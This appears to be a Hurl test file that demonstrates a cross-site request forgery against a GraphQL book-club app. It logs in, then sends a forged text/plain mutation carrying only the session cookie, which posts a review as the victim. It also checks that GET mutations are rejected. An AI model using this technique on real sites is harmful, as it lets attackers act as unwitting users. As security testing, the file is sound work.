# Cross-site request forgery: a page on any site can send this without JavaScript (a <form> with
# enctype="text/plain"), and the browser attaches the victim's shelfie_token cookie.

# C01 Sign in as the player, as the web app would; the token is what the cookie would hold
POST {{url}}
Content-Type: application/json
{"query": "mutation { login(username: \"ben\", password: \"ben-pw\") }"}
HTTP 200
[Captures]
token: jsonpath "$.data.login"

# C02 The forged request: text/plain (a CORS-simple type, no preflight) and only the cookie
POST {{url}}
Content-Type: text/plain
Cookie: shelfie_token={{token}}
```
{"query": "mutation { addReview(clubId: \"c2\", bookId: \"b1\", rating: 1, body: \"posted by a page Ben never saw\") { author { name } } }"}
```
HTTP 200
[Asserts]
jsonpath "$.data.addReview.author.name" == "Ben"

# C03 The GET version (an <img src>): Spring refuses mutations over GET with 405
GET {{url}}
Cookie: shelfie_token={{token}}
[Query]
query: mutation { removeReview(id: "v31") }
HTTP 405
